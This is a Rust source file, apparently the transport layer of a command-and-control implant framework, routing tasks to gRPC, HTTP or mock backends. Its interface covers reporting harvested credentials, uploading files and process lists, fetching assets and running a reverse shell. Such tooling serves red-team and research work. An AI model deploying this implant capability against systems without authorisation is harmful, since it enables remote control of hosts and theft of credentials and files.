use anyhow::{anyhow, Result};
use pb::c2::*;
use std::sync::mpsc::{Receiver, Sender};

#[cfg(feature = "grpc")]
mod grpc;

#[cfg(feature = "grpc-doh")]
mod dns_resolver;

#[cfg(feature = "http1")]
mod http;

#[cfg(feature = "mock")]
mod mock;
#[cfg(feature = "mock")]
pub use mock::MockTransport;

mod transport;
pub use transport::Transport;

#[derive(Clone)]
pub enum ActiveTransport {
    #[cfg(feature = "grpc")]
    Grpc(grpc::GRPC),
    #[cfg(feature = "http1")]
    Http(http::HTTP),
    #[cfg(feature = "mock")]
    Mock(mock::MockTransport),
    Empty,
}

impl Transport for ActiveTransport {
    fn init() -> Self {
        Self::Empty
    }

    fn new(uri: String, proxy_uri: Option<String>) -> Result<Self> {
        // Simple scheme detection
        if uri.starts_with("http://") || uri.starts_with("https://") {
            #[cfg(feature = "http1")]
            return Ok(ActiveTransport::Http(http::HTTP::new(uri, proxy_uri)?));
            #[cfg(not(feature = "http1"))]
            return Err(anyhow!("HTTP transport not enabled"));
        } else if uri.starts_with("grpc://") || uri.starts_with("grpcs://") || uri.starts_with("tcp://") {
             #[cfg(feature = "grpc")]
             return Ok(ActiveTransport::Grpc(grpc::GRPC::new(uri, proxy_uri)?));
             #[cfg(not(feature = "grpc"))]
             return Err(anyhow!("gRPC transport not enabled"));
        } else if uri == "mock" {
             #[cfg(feature = "mock")]
             return Ok(ActiveTransport::Mock(mock::MockTransport::new(uri, proxy_uri)?));
             #[cfg(not(feature = "mock"))]
             return Err(anyhow!("Mock transport not enabled"));
        }

        Err(anyhow!("Could not determine transport from URI: {}", uri))
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.claim_tasks(request).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.claim_tasks(request).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.claim_tasks(request).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        sender: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.fetch_asset(request, sender).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.fetch_asset(request, sender).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.fetch_asset(request, sender).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.report_credential(request).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.report_credential(request).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.report_credential(request).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.report_file(request).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.report_file(request).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.report_file(request).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.report_process_list(request).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.report_process_list(request).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.report_process_list(request).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn report_task_output(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.report_task_output(request).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.report_task_output(request).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.report_task_output(request).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn reverse_shell(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.reverse_shell(rx, tx).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.reverse_shell(rx, tx).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.reverse_shell(rx, tx).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    fn is_active(&self) -> bool {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.is_active(),
            #[cfg(feature = "http1")]
            Self::Http(t) => t.is_active(),
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.is_active(),
            Self::Empty => false,
        }
    }

    fn name(&self) -> &'static str {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.name(),
            #[cfg(feature = "http1")]
            Self::Http(t) => t.name(),
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.name(),
            Self::Empty => "none",
        }
    }

    fn list_available(&self) -> Vec<String> {
        let mut list = Vec::new();
        #[cfg(feature = "grpc")]
        list.push("grpc".to_string());
        #[cfg(feature = "http1")]
        list.push("http".to_string());
        #[cfg(feature = "mock")]
        list.push("mock".to_string());
        list
    }
}
